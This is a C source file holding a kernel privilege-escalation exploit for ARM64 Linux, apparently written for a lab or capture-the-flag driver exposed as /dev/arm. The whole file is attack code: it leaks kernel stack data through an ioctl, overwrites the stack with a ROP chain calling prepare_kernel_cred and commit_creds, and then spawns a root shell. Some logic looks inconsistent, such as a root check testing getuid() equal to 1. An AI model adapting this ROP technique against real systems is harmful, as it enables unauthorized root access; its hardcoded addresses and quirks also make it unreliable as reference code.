#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define WRITE_STACK 0
#define READ_STACK 1

#define MAX_MSG 1024

unsigned long prepare_kernel_cred = 0xffff8000100a2318;
unsigned long commit_creds = 0xffff8000100a2060;

unsigned long pop_x19_pop_x0 = 0xffff80001014b7c8; // ldr x19, [sp, #0x10]; ldr x0, [sp, #0x28]; ldp x29, x30, [sp], #0x30; ret;
unsigned long blr_x19_pop_x19_x20 = 0xffff8000107d6a84; // blr x19; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;
//unsigned long eret = 0xffff8000100124c0; // restore pc and sp and return from syscall | ldp	x21, x22, [sp, #S_PC]	
unsigned long eret = 0xfffffbfffdbfa7ec;

typedef struct read_write_stack{
	unsigned long size;
	unsigned long *buf;
} read_write_stack;

unsigned long user_sp;

void save_sp(){
	__asm("mov %[user_sp], sp"
		: [user_sp] "=r" (user_sp));
}

void spawn_shell(){
    printf("[+] Returned to userland, spawning root shell...\n");
    if(getuid() == 1){
        printf("[+] Privilege level successfully escalated, spawning shell...\n");
	char *arg[2] = {"/bin/sh", NULL};
        execve("/bin/sh", arg, NULL);
	exit(0);
    }else{
        printf("[-] Failed to escalate privileges, exiting...\n");
        exit(-1);
    }
}

void create_rop_chain(unsigned long* buf, unsigned int off){
	unsigned long dummy = 0xdeadbeefdeadbeef;
	buf[off++] = pop_x19_pop_x0;
	buf[off++] = dummy;
	buf[off++] = dummy;
	buf[off++] = dummy;
	buf[off++] = dummy;
	buf[off++] = dummy;
	buf[off++] = dummy;// __arm64_sys_ioctl pops until here
	buf[off++] = dummy; // sp -> x29
	buf[off++] = blr_x19_pop_x19_x20; // sp + 0x8 -> x30
	buf[off++] = prepare_kernel_cred; // sp + 0x10 -> x19
	buf[off++] = dummy;
	buf[off++] = dummy;
	buf[off++] = 0x0; // sp + 0x28 -> x0
	buf[off++] = dummy; // new sp -> x29
	buf[off++] = blr_x19_pop_x19_x20;	// sp + 0x08 -> x30
	buf[off++] = commit_creds; // sp + 0x10 -> x19
	buf[off++] = dummy; // sp + 0x18 -> x20
	buf[off++] = dummy; // new sp
	buf[off++] = eret;
	buf[off++] = dummy; // sp + 0x10 -> x19
	buf[off++] = dummy; // sp + 0x18 -> x20
	buf[off++] = dummy; // sp + 0x20 -> x29
	buf[off++] = dummy; // sp + 0x28 -> x30
}

void dump_payload(unsigned long *buf, unsigned int size){
	printf("****************DUMP********************\n");
	for(int i = 0; i < size; i += 2){
		printf("0x%016lx\t0x%016lx\n", buf[i], buf[i+1]);
	}
	printf("****************************************\n");
}

int main(){
	int fd;
	long ret;
    unsigned long *buf = (unsigned long*)malloc(sizeof(unsigned long) * 92);
    read_write_stack messenger;
    messenger.buf = buf;
    unsigned long stack_addr;

	printf("[+] Opening device file...\n");
	fd = open("/dev/arm", O_RDWR);
	if(fd < 0){
		printf("[-] Failed to open device file\n");
		exit(-1);
	}

    messenger.size = 608;

	printf("[+] Trying to read from kernel stack...\n");
	ret = ioctl(fd, READ_STACK, (unsigned long)&messenger);
	if(ret < 0){
		printf("[-] Failed to read from kernel stack\n");
		exit(-1);
	}

	printf("[+] x30 of outer function: 0x%lx\n", buf[66]);
	stack_addr = buf[67] - 0x278;
	printf("[+] Stack address: 0x%lx\n", stack_addr);

	save_sp();
	printf("[+] Stack pointer: 0x%016lx\n", user_sp);
	for(int i = 0; i < 64; i++){
		buf[i] = 0x4141414141414141;
	}
	create_rop_chain(buf, 66);

	messenger.size = 736;

	printf("[+] Sending payload...\n");
	ret = ioctl(fd, WRITE_STACK, (unsigned long)&messenger);
	if(ret < 0){
		printf("[-] Failed to write to kernel stack\n");
		exit(-1);
	}

	printf("[-] You shall not pass...\n");

	free(buf);
	return 0;
}
